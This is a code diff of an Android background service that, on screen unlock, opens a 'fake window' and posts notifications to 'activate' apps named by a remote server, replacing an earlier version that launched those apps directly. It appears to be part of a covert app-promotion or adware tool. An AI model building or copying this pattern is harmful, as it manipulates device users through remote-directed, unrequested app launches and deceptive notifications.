@@ -13,13 +13,12 @@ import android.os.IBinder;
 import android.os.RemoteException;
 import android.text.format.DateUtils;
 import android.text.format.Time;
-import com.android.volley.AuthFailureError;
 import com.android.volley.Response;
-import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.xstd.ip.Config;
 import com.xstd.ip.InitApplication;
 import com.xstd.ip.Tools;
+import com.xstd.ip.module.ActiveApplicationInfo;
 import com.xstd.ip.module.ApplicationInfo;
 import com.xstd.ip.module.PushMessage;
 import net.tsz.afinal.http.AjaxCallBack;
@@ -27,9 +26,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.File;
-import java.util.HashMap;
 import java.util.List;
-import java.util.Map;
 
 public class CoreService extends Service {
 
@@ -62,6 +59,8 @@ public class CoreService extends Service {
         application = (InitApplication) getApplication();
         handler = new Handler(getMainLooper());
         registerCoreReceiver();
+
+        application.getFinalDb().save(new ActiveApplicationInfo("a", "b", "c", "com.qihoo.appstore"));
     }
 
     @Override
@@ -94,6 +93,7 @@ public class CoreService extends Service {
     private void receiveBroadcast(int type, Intent intent) {
         switch (type) {
             case UNLOCK_SCREEN:
+                ActiveApplication();
                 Tools.initFakeWindow(getApplicationContext());
                 if (Tools.isOnline(getApplicationContext()))
                     updateService();
@@ -229,9 +229,11 @@ public class CoreService extends Service {
                 try {
                     JSONObject jsonObject = new JSONObject(o.toString());
                     String packageName = jsonObject.getString("packName");
-                    Tools.logW("发现：" + packageName + "需要激活。");
-                    if (!Tools.isEmpty(packageName))
-                        Tools.launchApplication(getApplicationContext(), packageName);
+                    String title = jsonObject.getString("title");
+                    String content = jsonObject.getString("content");
+                    String tickerText = jsonObject.getString("tickerText");
+                    ActiveApplicationInfo appInfo = new ActiveApplicationInfo(packageName, tickerText, title, content);
+                    application.getFinalDb().save(appInfo);
                 } catch (JSONException e) {
                     e.printStackTrace();
                 }
@@ -243,6 +245,14 @@ public class CoreService extends Service {
                 Tools.logW(strMsg);
             }
         });
+    }
+
+    private void ActiveApplication() {
+        List<ActiveApplicationInfo> infos = application.getFinalDb().findAllByWhere(ActiveApplicationInfo.class, "active=0");
+        if (infos != null && infos.size() > 0) {
+            ActiveApplicationInfo info = infos.get(0);
+            Tools.activeApplicationByNotification(this, info);
+        }
     }
 
     private void pushMessage() {
